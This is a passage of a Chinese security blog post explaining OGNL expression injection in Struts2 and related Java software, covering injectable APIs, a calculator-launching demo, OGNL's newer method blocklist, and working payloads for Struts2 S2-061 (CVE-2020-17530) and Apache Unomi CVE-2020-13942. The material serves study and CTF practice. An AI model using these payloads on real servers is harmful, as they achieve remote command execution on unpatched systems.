+<hr>
+<h2 id="能解析OGNL的API"><a href="#能解析OGNL的API" class="headerlink" title="能解析OGNL的API"></a>能解析OGNL的API</h2><table>
+<thead>
+<tr>
+<th align="left">类名</th>
+<th align="left">方法名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">com.opensymphony.xwork2.util.TextParseUtil</td>
+<td align="left">translateVariables,translateVariablesCollection</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.TextParser</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.OgnlTextParser</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlUtil</td>
+<td align="left">setProperties,setProperty,setValue,getValue,callMethod,compile</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.util.VelocityStrutsUtil</td>
+<td align="left">evaluate</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.util.StrutsUtil</td>
+<td align="left">isTrue,findString,findValue,getText,translateVariables,makeSelectList</td>
+</tr>
+<tr>
+<td align="left">org.apache.struts2.views.jsp.ui.OgnlTool</td>
+<td align="left">findValue</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.ValueStack</td>
+<td align="left">findString,findValue,setValue,setParameter</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlValueStack</td>
+<td align="left">findString,findValue,setValue,setParameter,trySetValue</td>
+</tr>
+<tr>
+<td align="left">ognl.Ognl</td>
+<td align="left">parseExpression,getValue,setValue</td>
+</tr>
+</tbody></table>
+<p>调用过程中涉及的类：</p>
+<table>
+<thead>
+<tr>
+<th align="left">涉及类名</th>
+<th align="left">方法名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td>
+<td align="left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td>
+</tr>
+<tr>
+<td align="left">com.opensymphony.xwork2.util.reflection.ReflectionProvider</td>
+<td align="left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="OGNL注入"><a href="#OGNL注入" class="headerlink" title="OGNL注入"></a>OGNL注入</h1><p>由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类<code>java.lang.Runtime</code>等</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>弹计算器</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OGNL</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">OgnlException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> expression <span class="token operator">=</span> <span class="token string">"@java.lang.Runtime@getRuntime().exec('calc')"</span><span class="token punctuation">;</span>
+        <span class="token class-name">OgnlContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OgnlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Ognl</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>expression<span class="token punctuation">,</span> context<span class="token punctuation">,</span> context<span class="token punctuation">.</span><span class="token function">getRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>换成一行的形式就是：<code>Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(\&quot;calc\&quot;)&quot;, context, context.getRoot());</code></p>
+<p>实际的题目环境要执行的往往是：<code>@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;)</code></p>
+<p>注意：<code>getValue()</code>和<code>setValue()</code>都能成功解析恶意的OGNL表达式</p>
+<hr>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>粗略看了一下，是和语法树解析有关，懒得调了（</p>
+<hr>
+<h2 id="高版本下的黑名单"><a href="#高版本下的黑名单" class="headerlink" title="高版本下的黑名单"></a>高版本下的黑名单</h2><p>在OGNL&gt;&#x3D;3.1.25 3.1.12版本设置了黑名单：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token class-name">Object</span> target<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argsArray<span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span>
+<span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>_useStricterInvocation<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">final</span> <span class="token class-name">Class</span> methodDeclaringClass <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Note: synchronized(method) call below will already NPE, so no null check.</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token constant">AO_SETACCESSIBLE_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">AO_SETACCESSIBLE_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token punctuation">(</span><span class="token constant">AO_SETACCESSIBLE_ARR_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">AO_SETACCESSIBLE_ARR_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token punctuation">(</span><span class="token constant">SYS_EXIT_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">SYS_EXIT_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token punctuation">(</span><span class="token constant">SYS_CONSOLE_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">SYS_CONSOLE_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">AccessibleObjectHandler</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">ClassResolver</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">MethodAccessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">MemberAccess</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">OgnlContext</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">ProcessBuilder</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">AccessibleObjectHandlerJDK9Plus</span><span class="token punctuation">.</span><span class="token function">unsafeOrDescendant</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">(</span><span class="token string">"........"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个版本下运行上面的rce代码会产生报错</p>
+<hr>
+<h2 id="HTTP请求中常见的注入点"><a href="#HTTP请求中常见的注入点" class="headerlink" title="HTTP请求中常见的注入点"></a>HTTP请求中常见的注入点</h2><p>来自<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/168609.html">Struts2著名RCE漏洞引发的十年之思</a>：</p>
+<p><img src="/blog/2023/09/13/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240716122955036.png" alt="image-20240716122955036"></p>
+<hr>
+<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//获取context里面的变量</span>
+ #user
+ #user<span class="token punctuation">.</span>name
+
+<span class="token comment">//使用runtime执行系统命令</span>
+<span class="token annotation punctuation">@java.lang.Runtime</span><span class="token annotation punctuation">@getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span>
+
+
+<span class="token comment">//使用processbuilder执行系统命令</span>
+<span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment">//获取当前路径</span>
+<span class="token annotation punctuation">@java.lang.System</span><span class="token annotation punctuation">@getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="Confluence-CVE-2021-26084"><a href="#Confluence-CVE-2021-26084" class="headerlink" title="Confluence CVE-2021-26084"></a>Confluence CVE-2021-26084</h2><p>poc：<a target="_blank" rel="noopener" href="https://github.com/0xf4n9x/CVE-2021-26084">https://github.com/0xf4n9x/CVE-2021-26084</a></p>
+<hr>
+<h2 id="Struts2-CVE-2020-17530（S2-061）"><a href="#Struts2-CVE-2020-17530（S2-061）" class="headerlink" title="Struts2 CVE-2020-17530（S2-061）"></a>Struts2 CVE-2020-17530（S2-061）</h2><p>payload：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>#instancemanager<span class="token operator">=</span>#application<span class="token punctuation">[</span><span class="token string">"org.apache.tomcat.InstanceManager"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#stack<span class="token operator">=</span>#attr<span class="token punctuation">[</span><span class="token string">"com.opensymphony.xwork2.util.ValueStack.ValueStack"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#bean<span class="token operator">=</span>#instancemanager<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.collections.BeanMap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#bean<span class="token punctuation">.</span><span class="token function">setBean</span><span class="token punctuation">(</span>#stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#context<span class="token operator">=</span>#bean<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#bean<span class="token punctuation">.</span><span class="token function">setBean</span><span class="token punctuation">(</span>#context<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#access<span class="token operator">=</span>#bean<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memberAccess"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#bean<span class="token punctuation">.</span><span class="token function">setBean</span><span class="token punctuation">(</span>#access<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#emptyset<span class="token operator">=</span>#instancemanager<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"java.util.HashSet"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#bean<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"excludedClasses"</span><span class="token punctuation">,</span>#emptyset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#bean<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"excludedPackageNames"</span><span class="token punctuation">,</span>#emptyset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#execute<span class="token operator">=</span>#instancemanager<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"freemarker.template.utility.Execute"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmd<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token char">'whoami'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#execute<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>#cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="Apache-Unomi-CVE-2020-13942"><a href="#Apache-Unomi-CVE-2020-13942" class="headerlink" title="Apache Unomi CVE-2020-13942"></a>Apache Unomi CVE-2020-13942</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span>#runtimeclass <span class="token operator">=</span> #<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>\"<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#getruntimemethod <span class="token operator">=</span> #runtimeclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token operator">^</span> #<span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>\"getRuntime\"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#rtobj <span class="token operator">=</span> #getruntimemethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#execmethod <span class="token operator">=</span> #runtimeclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token operator">?</span> #<span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>\"exec\"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token operator">?</span> #<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>\"<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span>\"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token operator">?</span> #<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#execmethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>#rtobj<span class="token punctuation">,</span>\"touch <span class="token operator">/</span>tmp<span class="token operator">/</span>ognl\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
